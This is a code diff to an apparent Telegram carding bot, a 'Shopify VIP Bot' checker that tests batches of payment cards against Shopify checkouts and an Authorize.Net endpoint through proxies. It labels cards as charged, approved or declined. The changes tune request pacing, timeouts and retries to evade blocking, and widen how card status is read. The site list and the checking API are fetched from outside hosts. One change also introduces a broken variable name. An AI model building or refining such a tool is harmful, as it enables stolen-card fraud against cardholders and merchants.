@@ -1,5 +1,5 @@
 # ==============================================================================
-# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
+# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘𝗠 (HIGH-SPEED CPM ENGINE)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -92,11 +92,11 @@ AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-# التعديلات المطلوبة
+# التعديلات المطلوبة للـ API البطيء (7-8 ثواني)
 WORKERS = 40  
-DELAY = 3  
+DELAY = 10  
 HIT_DELAY = 1.0
-API_TIMEOUT = 60
+API_TIMEOUT = 90 # تم رفع وقت الانتظار حتى لا يقطع الاتصال على الـ API البطيء
 
 _SITE_ERRORS_COUNT = {}
 _MAX_SITE_ERRORS = 3
@@ -560,7 +560,7 @@ async def is_user_joined(uid, bot):
     return True
 
 async def send_welcome_menu(update_or_bot, uid, plan, limit):
-    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
+    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID_ID else ""
     
     t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
 
@@ -787,7 +787,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             except Exception: 
                 rm = text_data.strip()
                 
-            # حماية صارمة ضد الفحص الوهمي (Fake Hits) وصفحات Cloudflare/HTML
             if not is_json:
                 if resp.status != 200 or "<html" in text_data.lower() or len(text_data) > 300:
                     return {'status': 'Site Error', 'message': 'API Returned HTML/Error Page (Blocked)', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
@@ -802,16 +801,16 @@ async def check_shopify_api(api_url, card, site, proxy, session):
                 rm = 'Card Declined'
                 clean_rm = 'card declined'
             
-            if 'charged' in clean_rm or 'completed' in clean_rm or 'payment succeeded' in clean_rm or 'success' in clean_rm: 
+            if any(k in clean_rm for k in ['charged', 'completed', 'payment succeeded', 'success', 'succeeded', 'captured']): 
                 return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
                 
-            if '3d' in clean_rm or 'secure' in clean_rm or 'otp' in clean_rm:
-                return {'status': 'Dead', 'message': 'Card Declined', 'card': card, 'gateway': gt, 'price': pr}
+            if '3d' in clean_rm or 'secure' in clean_rm or 'otp' in clean_rm or 'challenge' in clean_rm:
+                return {'status': 'Dead', 'message': 'Card Declined (3D Secure)', 'card': card, 'gateway': gt, 'price': pr}
                 
-            if 'approved' in clean_rm or any(k in clean_rm for k in ['invalid_cvv', 'match']): 
+            if any(k in clean_rm for k in ['approved', 'cvv match', 'security code']) or any(k in clean_rm for k in ['invalid_cvv', 'incorrect_cvv', 'match']): 
                 return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
                 
-            if 'insufficient' in clean_rm or 'funds' in clean_rm or 'balance' in clean_rm:
+            if 'insufficient' in clean_rm or 'funds' in clean_rm or 'balance' in clean_rm or 'low balance' in clean_rm:
                 return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
             
             if any(k in clean_rm for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
@@ -855,7 +854,6 @@ async def check_authnet_api(card, proxy, session):
             except Exception:
                 rm = text_data.strip()
                 
-            # حماية صارمة ضد الفحص الوهمي (Fake Hits) وصفحات Cloudflare/HTML
             if not is_json:
                 if resp.status != 200 or "<html" in text_data.lower() or len(text_data) > 300:
                     return {'status': 'Site Error', 'message': 'API Returned HTML/Error Page (Blocked)', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
@@ -913,6 +911,7 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                     except IndexError: p = None
                 r = await check_authnet_api(card, p, session)
                 if r.get('status') == 'Site Error':
+                    await asyncio.sleep(random.uniform(2.0, 4.0)) 
                     last_res = r
                     continue
                 return r
@@ -969,7 +968,9 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                     continue
 
                 if status == 'Site Error' or is_dead_site_error(msg):
-                    _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
+                    if "html" not in clean_msg and "blocked" not in clean_msg:
+                        _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
+                    await asyncio.sleep(random.uniform(3.0, 5.0))
                     lr = r
                     continue
             else:
@@ -1571,10 +1572,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
 
     current_workers = 1 if gate_name == "AuthNet" else WORKERS
 
-    # قفل التوازن المتسلسل (Sequential Pacing Lock) للتحكم بالـ CPM بدقة بالغة
+    # قفل التوازن المتسلسل للتحكم بالسرعة
     pacing_lock = asyncio.Lock()
-    
-    # مصفوفة لتجميع مهام إرسال الـ Hits لضمان اكتمالها بالكامل قبل تدمير الجلسة
     hit_tasks = []
 
     async def dashboard_updater():
@@ -1616,45 +1615,56 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 if queue.empty() or is_stopped(): break
                 try: card = queue.get_nowait()
                 except Exception: break
-                try:
-                    # محرك تنظيم التدفق المتسلسل لثبات الـ CPM حوالي 50-60
-                    async with pacing_lock:
-                        if not is_stopped():
-                            await asyncio.sleep(random.uniform(1.0, 1.25))
-                    
-                    if is_stopped(): break
-                    
-                    c_st = time.time()
-                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=6)
-                    if is_stopped(): break 
-                    c_el = time.time() - c_st
-                    status = res.get('status', 'Dead')
-                    
-                    if status == 'Site Error':
+                
+                # الحلقة الاحترافية اللانهائية: لن تترك البطاقة أبداً حتى تأتي استجابة مالية حقيقية وصريحة من الـ API
+                while not is_stopped():
+                    try:
+                        async with pacing_lock:
+                            if not is_stopped():
+                                await asyncio.sleep(random.uniform(0.1, 0.3))
+                        
+                        if is_stopped(): break
+                        
+                        c_st = time.time()
+                        res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=6)
+                        if is_stopped(): break 
+                        
+                        c_el = time.time() - c_st
+                        status = res.get('status', 'Dead')
+                        raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
+                        
+                        # [تعديل ذهبي]: في حال حدوث أي خطأ بروكسي/اتصال/سيرفر، قم بإعادة المحاولة فوراً لنفس البطاقة وبدون احتسابها في عداد chk
+                        if status == 'Site Error':
+                            err += 1
+                            last_resp = sf(f"Retry Err: {(raw_msg[:25] + '..') if len(raw_msg) > 25 else raw_msg}")
+                            await asyncio.sleep(1.5) # مهلة بسيطة لتبديل الموقع أو البروكسي في المحاولة القادمة
+                            continue # إعادة المحاولة لنفس البطاقة
+                            
+                        # الـ API رد برد صريح وتم التعرف على حالة البطاقة بنجاح
                         chk += 1
+                        last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
+                        
+                        if status == 'Charged':
+                            chg += 1
+                            ht_task = asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
+                            hit_tasks.append(ht_task)
+                        elif status == 'Approved': 
+                            app += 1
+                        elif status == 'Insufficient': 
+                            ins += 1
+                        else: 
+                            dec += 1
+                            
+                        break # الخروج من الحلقة الداخلية للبطاقة والانتقال للبطاقة التالية بالملف
+                    except asyncio.CancelledError: 
+                        break
+                    except Exception as e:
                         err += 1
+                        last_resp = sf(f"Sys Err: {str(e)[:20]}")
+                        await asyncio.sleep(2)
                         continue
                         
-                    chk += 1
-                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
-                    last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
-                    
-                    if status == 'Charged':
-                        chg += 1
-                        ht_task = asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
-                        hit_tasks.append(ht_task)
-                    elif status == 'Approved': 
-                        app += 1
-                    elif status == 'Insufficient': 
-                        ins += 1
-                    else: 
-                        dec += 1
-                except asyncio.CancelledError: break
-                except Exception: 
-                    chk += 1
-                    err += 1
-                finally:
-                    queue.task_done()
+                queue.task_done()
             
             await asyncio.sleep(0.01)
 
